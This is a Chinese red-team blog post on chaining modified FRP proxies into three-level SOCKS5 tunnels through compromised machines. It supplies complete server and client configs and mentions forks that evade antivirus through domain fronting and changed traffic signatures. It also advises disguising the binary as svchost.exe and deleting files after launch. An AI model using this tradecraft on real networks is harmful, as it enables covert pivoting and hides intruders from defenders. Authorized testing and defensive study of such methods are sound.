---
title: redteam实战中的Frp多级代理
url: https://www.svenbeast.com/post/NIsft997g/
source: 攻城肾透shi | sv3nbeast
date: 2022-12-03
fetch_date: 2025-10-04T00:22:53.042971
---

# redteam实战中的Frp多级代理

[攻城肾透shi | sv3nbeast](https://www.svenbeast.com)

[首页](/)
[📃文章列表](/posts)
[📖归档](/archives)
[🏷️标签](/tags)
[🔥关于](/post/about)
[ ]

[攻城肾透shi | sv3nbeast](https://www.svenbeast.com)

Dark

\u6697\u9ED1

☰ Menu

☰ 菜单

[首页](/)
[📃文章列表](/posts)
[📖归档](/archives)
[🏷️标签](/tags)
[🔥关于](/post/about)

# redteam之实战隧道代理方案

Author:
[斯文](/)

Date: 2022-12-02
Reading Time:4.5 mins
words:1162

Category:
[红队](https://www.svenbeast.com/tag/kroo8dSGd/)
[代理](https://www.svenbeast.com/tag/XT2Jo3goU/)
[笔记](https://www.svenbeast.com/tag/rwt8EXIMSg/)

share:

作者:
[斯文](/)
日期: 2022-12-02
阅读时间:4.5 分钟
字数:1162
分类:
[红队](https://www.svenbeast.com/tag/kroo8dSGd/)
[代理](https://www.svenbeast.com/tag/XT2Jo3goU/)
[笔记](https://www.svenbeast.com/tag/rwt8EXIMSg/)

分享:

### 0x01 浅言

​ 在红队行动中，搭建隧道几乎可以说是必遇到的攻击场景之一，所以提前准备好相应的隧道代理方案对于提高攻击效率尤为重要，实际项目中会遇到的问题也是本文主要解决的问题如下:

* 1.每多一层代理就重头开始搭建一次隧道，无序且混乱
* 2.杀软查杀
* 3.代理进程特征明显，被目标或其他队伍发现异常导致代理掉线，将时间浪费在重复搭建的过程中

### 0x02 拓扑图及工具

项目地址: https://github.com/DongHuangT1/Frp

* 此二开版支持websocket协议的域前置，将用做入口点机器的隧道搭建

项目地址: https://github.com/Goqi/Erfrp

* 此二开版修改了流量特征，将用做内网机器的隧道搭建

FRP多级代理拓扑图: https://github.com/sv3nbeast/Frp-Mapping

* 文字描述繁琐且不好理解，这里画一个多级代理的拓扑图方便理解

![](https://www.svenbeast.com/post-images/1670510756528.png)

​ 实际上frp经过修改过的源码杀软查杀并不严重，所以二开过的frp，过杀软可以算是一个被动技能，若有习惯其他优秀隧道软件的，如stowaway、fuso、nps等，推荐按此文理清代理逻辑进行方案复刻。

### 0x03 代理流程

​ 通过编写的多级代理拓扑图可以发现不同层级代理的一点区别，无论是入口点机器还是内网机器无非就是提前在客户端配置文件内写好客户端和服务端的端口对应，那么为什么不从一开始就使用多级代理的配置文件从而避免内网横向后重新搭建二层、三层代理呢，遂这里提供个人在使用的最高支持三级代理的配置文件。

![](https://www.svenbeast.com/post-images/1670510764674.png)!

#### 1.公网服务端

```
#frps.ini
[common]
token = xxxxxx
bind_port = 80
websocket_path = /xxxxx
dingding_token =
```

#### 2.入口点客户端

```
#frpc.ini
[common]
token = xxxxxx
del_enable = true
server_addr = author.xxx.com.xx.xx.com.cn
server_port = 80
protocol = websocket
websocket_path = /xxxxx
websocket_host = author.xxx.com

[socks5_to_1]
type = tcp
remote_port = 20000
plugin = socks5
plugin_user = admin
plugin_passwd = admin123
use_encryption = true
use_compression = true

[socks5_to_2]
type = tcp
local_ip = 127.0.0.1
local_port = 10088
remote_port = 12020

[socks5_to_3]
type = tcp
local_ip = 127.0.0.1
local_port = 11088
remote_port = 13020
```

#### 3.入口点服务端

```
#frps.ini
[common]
bind_port = 7000
```

#### 4.二级代理机客户端

```
#frpc.ini
[common]
#入口点服务端机器的IP
server_addr = 192.168.3.75
server_port = 7000

[socks5_to_1]
type = tcp
plugin = socks5
remote_port = 10088

[socks5_to_2]
type = tcp
local_ip = 127.0.0.1
local_port = 12088
remote_port = 11088
```

#### 5.二级代理机服务端

```
#frps.ini
[common]
bind_port = 7000
```

#### 6.三级代理机客户端

```
#frpc.ini
[common]
#二级代理服务端机器的IP
server_addr = 192.168.3.144
server_port = 7000

[socks5_to_1]
type = tcp
plugin = socks5
remote_port = 12088
```

#### 不同层级代理连接地址

```
入口点机器代理
socks5 100.100.100.100:20000   admin  admin123

二级代理机器代理
socks5 100.100.100.100:12020  无密码

三级代理机器代理
socks5 100.100.100.100:13020  无密码
```

​ 上面是最多支持三级代理的各个配置文件和连接信息，每次项目开始搭建第一个隧道时直接按照三级代理的层级进行搭建即可，每多一层直接在下一台机器进行连接。

**注: 因为使用了2种二开版frp，所以在使用时需保证客户端和服务端为同一种frp**

### 0x04 算不上tips的tips

#### 启动方式

​ frp默认会加载当前目录下的frpc.ini文件，建议直接修改携带伪装性的frp文件名字，如linux的agent、windows的svchost.exe，并上传frpc.ini到当前目录，这样直接启动不需要携带任何参数，然后删除配置文件即可，虽然很多人使用的frp支持http远程加载和加密参数传输，但就特征而言，是很明显的，通过传参进行确定曾经kill过很多其他队伍的代理工具，所以不建议传任何参数。

![](https://www.svenbeast.com/post-images/1670510837573.png)

如果觉得上传frpc.ini文件不习惯，可以修改此文件`/cmd/frpc/sub/root.go`，将默认加载的配置文件改成其他名字重新编译。

#### 删除文件

​ linux启动代理后不光可以删除配置文件，二进制文件也可以一起删掉，不会影响已启动得代理进程，在linux机中养成好习惯，运行后删除文件

### 0x05 结束

再总结一下优点:

* 按部就班，逻辑清晰，每次只需修改配置文件中的ip
* 搭建好后可以任意选择层级进行连接，而不是只能连接一层
* 不必考虑杀软
* 无进程特征

* + - [0x01 浅言](#0x01-%E6%B5%85%E8%A8%80)
    - [0x02 拓扑图及工具](#0x02-%E6%8B%93%E6%89%91%E5%9B%BE%E5%8F%8A%E5%B7%A5%E5%85%B7)
    - [0x03 代理流程](#0x03-%E4%BB%A3%E7%90%86%E6%B5%81%E7%A8%8B)
      * [1.公网服务端](#1%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E7%AB%AF)
      * [2.入口点客户端](#2%E5%85%A5%E5%8F%A3%E7%82%B9%E5%AE%A2%E6%88%B7%E7%AB%AF)
      * [3.入口点服务端](#3%E5%85%A5%E5%8F%A3%E7%82%B9%E6%9C%8D%E5%8A%A1%E7%AB%AF)
      * [4.二级代理机客户端](#4%E4%BA%8C%E7%BA%A7%E4%BB%A3%E7%90%86%E6%9C%BA%E5%AE%A2%E6%88%B7%E7%AB%AF)
      * [5.二级代理机服务端](#5%E4%BA%8C%E7%BA%A7%E4%BB%A3%E7%90%86%E6%9C%BA%E6%9C%8D%E5%8A%A1%E7%AB%AF)
      * [6.三级代理机客户端](#6%E4%B8%89%E7%BA%A7%E4%BB%A3%E7%90%86%E6%9C%BA%E5%AE%A2%E6%88%B7%E7%AB%AF)
      * [不同层级代理连接地址](#%E4%B8%8D%E5%90%8C%E5%B1%82%E7%BA%A7%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5%E5%9C%B0%E5%9D%80)
    - [0x04 算不上tips的tips](#0x04-%E7%AE%97%E4%B8%8D%E4%B8%8Atips%E7%9A%84tips)
      * [启动方式](#%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F)
      * [删除文件](#%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6)
    - [0x05 结束](#0x05-%E7%BB%93%E6%9D%9F)

Author:
斯文

Permalink:
<https://www.svenbeast.com/post/NIsft997g/>

License:
MIT License

作   者:
斯文

永久链接:
<https://www.svenbeast.com/post/NIsft997g/>

协   议:
MIT License

Tag(s):

[# 红队](https://www.svenbeast.com/tag/kroo8dSGd/)
[# 代理](https://www.svenbeast.com/tag/XT2Jo3goU/)
[# 笔记](https://www.svenbeast.com/tag/rwt8EXIMSg/)

back

标签:

[# 红队](https://www.svenbeast.com/tag/kroo8dSGd/)
[# 代理](https://www.svenbeast.com/tag/XT2Jo3goU/)
[# 笔记](https://www.svenbeast.com/tag/rwt8EXIMSg/)

返回

[针对"红队人员"的Github项目投毒发现及分析](https://www.svenbeast.com/post/ZVscVsf50/)
[Pentesting active directory 思路一览图](https://www.svenbeast.com/post/flYRjNxuy/)

赏  ![support](https://www.svenbeast.com/media/images/alipay.png)**支付宝**   ![support](https://www.svenbeast.com/media/images/wechat.png)**微信**

[京ICP备19028185号](http://beian.miit.gov.cn/)

攻城肾透shi | sv3nbeast ©Copyright
 ![dandan](https://i.loli.net/2020/03/31/kG71rUoEW5YQq4h.gif)

/\*
\*/

召唤伊斯特瓦尔